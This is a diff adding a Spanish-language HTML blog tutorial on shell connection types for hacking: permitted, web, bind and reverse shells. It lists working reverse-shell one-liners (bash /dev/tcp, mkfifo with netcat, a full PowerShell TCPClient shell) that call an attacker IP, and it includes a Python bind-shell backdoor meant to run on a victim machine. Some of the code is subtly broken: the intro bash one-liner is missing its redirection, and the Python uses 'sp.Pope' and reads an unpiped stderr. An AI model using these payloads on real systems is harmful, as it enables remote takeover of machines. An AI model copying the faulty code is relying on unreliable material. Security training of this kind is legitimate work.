@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Shells en Linux</title>
+  <link href="./css/shells-linux.css" rel="stylesheet">
+  <link rel="website icon" href="/assets/img/hacker.png">
+  <link rel="stylesheet" href="/assets/src/prism.js/prism-tomorrow.min.css">
+
+  <script src="/assets/src/prism.js/prism.min.js"></script>
+  <script src="/assets/src/prism.js/prism-python.min.js"></script>
+  <script src="/assets/src/prism.js/prism-powershell.min.js"></script>
+  <script src="/assets/src/prism.js/prism-bash.min.js"></script>
+  <script src="/js/date.js"></script>
+</head>
+
+<body onload="reloj()">
+
+  <!-- Cabecera (volver a la pagina principal, marca, reloj)-->
+  <div class="head">
+
+    <a href="/blog/index.html" id="blog">
+      <img src="/assets/img/blogging.png" width="30px">
+      <p>Blog</p>
+    </a>
+
+    <p id="home-link">By <a href="/index.html">@zyrox</a></p>
+
+    <p id="date"></p>
+
+  </div>
+
+  <!-- Titulo y subtitulo -->
+  <header>
+    <h1>Conexiones de shell en Linux (orientado a hacking)</h1>
+    <p>En este articulo hablare sobre los tipos de conexión de shell que existen, tanto en Linux como en windows.</p>
+  </header>
+
+  <div class="container">
+
+    <!-- Introducción -->
+    <p>
+      Existen muchos tipos de shell, pero principalmente se juntan en cuatro grupos o familias <b>reverse</b>,
+      <b>bind</b>, <b>web</b> y <b>permitidas</b>. Dentro de cada una de ellas están las interactivas, las
+      semi-interactivas y las que no lo son (no interactivas).
+      <br><br>Para aclararlo las interactivas permiten ejecutar comandos, atajos de teclado, combinaciones de teclas,
+      etc.
+      Luego las semi-interactivas solo permiten ejecutar comandos, sin poder usar ni ^L (Ctrl+L), ni ^C (Ctrl+C), ni
+      ningún tipo de shortcut. Estas mismas suelen ser las que obtienes al ejecutar una reverse shell, que
+      posteriormente
+      tratarías la tty para obtener una total interactividad.
+      <br><br>Y por ultimo las no interactivas que tan solo permiten ejecutar un solo comando y mueren. Este tipo son
+      suficiente como para ejecutar el típico oneliner de bash para entablar una mejor conexión
+      (<code>bash -i /dev/tcp/10.10.10.10/1234 1>&0</code>).
+    </p>
+
+    <br>
+    <br>
+
+    <section class="shells-permitidas">
+      <hr>
+      <h2 id="title-permitidas">SHELLS PERMITIDAS</h2>
+      <hr>
+
+      <br>
+
+      <p>
+        Este tipo de shells son muy comunes de ver dado que son las que se crean a propósito por los desarrolladores. Un
+        ejemplo seria SSH (Secure Shell), o por ejemplo haber habilitado la conexión por telnet y haber un comando a
+        nivel de sistema con el que obtienes una shell.
+      </p>
+
+      <br>
+
+      <!-- Video explicativo -->
+      <video controls autoplay loop muted nofullscreen>
+        <source src="/assets/videos/shells_linux-shells_permitidas.mp4" type="video/mp4">
+        <p>
+          Your browser doesn't support HTML video. Here is the <a
+            href="/assets/videos/shells_linux-shells_permitidas.mp4">link to download it</a>.
+        </p>
+      </video>
+
+      <br>
+
+      <p>
+        En el video se puede ver el caso anteriormente descrito, un router de Huawei que al conectarnos por telnet
+        proporcionando credenciales validas nos da una serie de opciones entre las cuales se encuentra ejecutar una
+        shell semi-interactiva en su sistema operativo, en este caso un BusyBox v1.00.
+      </p>
+
+    </section>
+
+    <br>
+    <br>
+
+    <section class="web-shells">
+
+      <hr>
+      <h2 id="title-web">WEB SHELLS</h2>
+      <hr>
+
+      <br>
+
+      <p>
+        Las web shells son un tipo de shell que se ejecuta en un servidor web. De normal estas son accesibles a traves
+        de un parámetro de la URL, aunque pueden ser de muchas formas y estar donde menos te lo esperas. Al tener poca
+        capacidad lo suyo es usarlas para ejecutar una reverse shell mas personalizada como alguna de las siguientes:
+      </p>
+
+      <ul>
+        <li><pre><code class="language-bash">bash -i >& /dev/tcp/10.10.10.10/1234 1>&0</code></pre></li>
+        <li><pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f</code></pre></li>
+        <li><pre><code class="language-powershell">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre></li>
+        <li>O bien puedes usar <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp.ps1</a> del repositorio de <a href="https://github.com/samratashok/nishang/tree/master">nishang</a> en GitHub (video de uso al final).</li>
+      </ul>
+
+      <p>
+        Un ejemplo de Web shell es el siguiente:
+      </p>
+
+      <br>
+
+      <!-- Ejemplo de web shell -->
+      <video controls autoplay loop muted nofullscreen>
+        <source src="/assets/videos/shells_linux-web_shell.mp4" type="video/mp4">
+        <p>
+          Your browser doesn't support HTML video. Here is the <a href="/assets/videos/shells_linux-web_shell.mp4">link
+            to download it</a>.
+        </p>
+      </video>
+
+    </section>
+
+    <br>
+    <br>
+
+    <section class="bind">
+
+      <hr>
+      <h2>BIND SHELLS</h2>
+      <hr>
+
+      <br>
+
+      <p>
+        Este tipo de shells son usadas como <i>backdoors</i> dado a que al ejecutarse se ponen en escucha en un puerto
+        de la victima. Para la conexión tan solo debes conectarte con <code>netcat</code> o con cualquier otra utilidad
+        por ese puerto para obtener la shell.<br>
+        <br>
+        Un ejemplo de código en Python para una bind shell seria el siguiente:<br>
+
+      <pre><code class="language-python">import socket as s
+import subprocess as sp
+
+s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
+s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
+s1.bind(("0.0.0.0",1234))
+s1.listen(1)
+c,a = s1.accept()
+
+while True:
+  d = c.recv(1024).decode()
+  p = sp.Pope(d, shell=True, stdout=sp.PIPE, stdin=sp.PIPE)
+  c.sendall(p.stdout.read()+p.stderr.read())</code></pre><br>
+
+      Este código en Python puede ser ejecutado en la maquina victima y conectarse a el a traves de una simple
+      instrucción de <code>netcat</code> como la siguiente: <code>nc 10.10.10.10 1234</code>
+
+      </p>
+
+      <p>Aquí un video épico</p>
+
+    </section>
+
+    <br>
+    <br>
+
+    <section class="reverse-shell">
+
+      <hr>
+      <h2>REVERSE SHELLS</h2>
+      <hr>
+
+      <br>
+
+      <p>
+        En este caso las reverse shells son básicamente lo mismo que las bind pero al revés, es decir, la victima en vez
+        de escuchar conexiones entrantes, pide la conexión a la maquina del atacante. Y el atacante se posiciona en
+        escucha por un puerto.
+        <br>
+        En estos videos te muestro dos ejemplos:
+      </p>
+      <details name="rev_shell-easy_way">
+        <summary style="cursor: pointer;">Manera fácil</summary>
+        <br>
+        <video controls muted nofullscreen>
+          <source src="/assets/videos/shells_linux-rev_shells-easy_way.mp4" type="video/mp4">
+          <p>
+            Your browser doesn't support HTML video. Here is the <a
+              href="/assets/videos/shells_linux-rev_shells-easy_way.mp4">link to download it</a>.
+          </p>
+        </video>
+        <p>En esta ocasion se configura un <i>payload</i> de la web <a href="https://revshells.com">revshells.com</a>
+          para Windows en PowerShell se ejecuta en una cmd de la victima.</p>
+      </details>
+      <details name="rev_shell-advanced-way">
+        <summary style="cursor: pointer;">Manera avanzada</summary>
+        <br>
+        <video controls muted nofullscreen>
+          <source src="/assets/videos/shells_linux-rev_shells-advanced_way.mp4">
+          <p>
+            Your browser doesn't support HTML video. Here is the <a
+              href="/assets/videos/shells_linux-rev_shells-advanced_way.mp4">link to download it</a>.
+          </p>
+        </video>
+        <p>En el video se muestra una manera mas avanzada en la que se usa el script <a
+            href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp</a>
+          del repositorio de <a href="https://github.com/samratashok/nishang/tree/master">nishang</a> en GitHub</p>
+      </details>
+
+    </section>
+  </div>
+
+</body>
+
+</html>
